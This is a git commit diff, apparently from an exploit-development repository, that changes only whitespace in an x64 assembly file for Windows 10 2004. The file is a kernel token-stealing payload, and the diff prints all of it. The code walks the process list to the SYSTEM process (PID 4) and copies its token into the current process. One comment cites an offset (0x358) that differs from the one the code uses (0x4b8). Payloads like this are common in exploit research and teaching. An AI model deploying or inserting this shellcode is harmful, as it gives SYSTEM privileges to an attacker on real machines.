851223ec116edc52556a605a46c4846042abb478
Connor McGarr <45445720+connormcgarr@users.noreply.github.com>
2020-07-08 17:58:40 -0500

    Update Windows_10_x64_2004.asm

--- Windows_10_x64_2004.asm
+++ Windows_10_x64_2004.asm
@@ -4,19 +4,19 @@
 [BITS 64]
 
 _start:
-	mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
+	mov rax, [gs:0x188]		  ; Current thread (_KTHREAD)
 	mov rax, [rax + 0xb8]		  ; Current process (_EPROCESS)
-	mov rbx, rax			        ; Copy current process (_EPROCESS) to rbx
+	mov rbx, rax			  ; Copy current process (_EPROCESS) to rbx
 __loop:
-	mov rbx, [rbx + 0x448] 		; ActiveProcessLinks
-	sub rbx, 0x448		   	    ; Go back to current process (_EPROCESS)
-	mov rcx, [rbx + 0x440] 		; UniqueProcessId (PID)
-	cmp rcx, 4 			          ; Compare PID to SYSTEM PID 
-	jnz __loop			          ; Loop until SYSTEM PID is found
+	mov rbx, [rbx + 0x448] 		  ; ActiveProcessLinks
+	sub rbx, 0x448		   	  ; Go back to current process (_EPROCESS)
+	mov rcx, [rbx + 0x440] 		  ; UniqueProcessId (PID)
+	cmp rcx, 4 			  ; Compare PID to SYSTEM PID 
+	jnz __loop			  ; Loop until SYSTEM PID is found
 
-	mov rcx, [rbx + 0x4b8]		; SYSTEM token is @ offset _EPROCESS + 0x358
-	and cl, 0xf0			        ; Clear out _EX_FAST_REF RefCnt
-	mov [rax + 0x4b8], rcx		; Copy SYSTEM token to current process
+	mov rcx, [rbx + 0x4b8]		  ; SYSTEM token is @ offset _EPROCESS + 0x358
+	and cl, 0xf0			  ; Clear out _EX_FAST_REF RefCnt
+	mov [rax + 0x4b8], rcx		  ; Copy SYSTEM token to current process
 
-	xor rax, rax			        ; set NTSTATUS STATUS_SUCCESS
-	ret				                ; Done!
+	xor rax, rax			  ; set NTSTATUS STATUS_SUCCESS
+	ret				  ; Done!
